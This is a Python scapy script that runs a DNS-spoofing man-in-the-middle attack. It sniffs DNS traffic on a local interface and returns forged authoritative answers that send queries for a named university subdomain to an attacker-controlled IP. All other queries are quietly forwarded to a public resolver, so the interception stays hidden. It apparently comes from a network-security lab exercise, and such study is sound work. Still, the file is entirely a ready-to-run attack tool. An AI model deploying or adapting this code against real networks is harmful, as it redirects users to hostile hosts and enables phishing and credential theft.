from scapy.all import *
import socket

attacker_ip = "192.168.0.254"
upstream_dns = "8.8.8.8"
upstream_port = 53
spoof_domain = b"xsite.singaporetech.edu.sg."

def forward_query(pkt):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)
    try:
        sock.sendto(bytes(pkt[DNS]), (upstream_dns, upstream_port))
        data, _ = sock.recvfrom(4096)
        return data  # raw DNS payload only
    except Exception as e:
        print(f"Upstream DNS error: {e}")
        return None
    finally:
        sock.close()

def dns_spoof(pkt):
    # Check if DNS layer and query present
    if not (UDP in pkt and DNS in pkt and pkt[DNS].qd):
        # Not DNS or incomplete, ignore or forward normally
        return

    qname = pkt[DNS].qd.qname
    src_ip = pkt[IP].src
    src_port = pkt[UDP].sport

    print(f"DNS Query for {qname.decode()} from {src_ip}")

    if qname == spoof_domain:
        # Build spoofed DNS response
        spoof_pkt = IP(dst=src_ip, src=pkt[IP].dst) / \
                    UDP(dport=src_port, sport=53) / \
                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=qname, ttl=300, rdata=attacker_ip))
        send(spoof_pkt, verbose=0)
        print(f"Sent spoofed reply for {qname.decode()} to {src_ip}")
    else:
        # Forward query to upstream and get raw DNS payload
        data = forward_query(pkt)
        if data:
            # Parse DNS payload only
            dns_resp = DNS(data)
            # Wrap with IP/UDP layers and swap src/dst accordingly
            resp_pkt = IP(src=pkt[IP].dst, dst=src_ip) / \
                       UDP(sport=53, dport=src_port) / \
                       dns_resp
            send(resp_pkt, verbose=0)
            print(f"Forwarded reply for {qname.decode()} to {src_ip}")
        else:
            print("No response from upstream")

sniff(filter="udp dst port 53", prn=dns_spoof, iface="eth0", store=0)
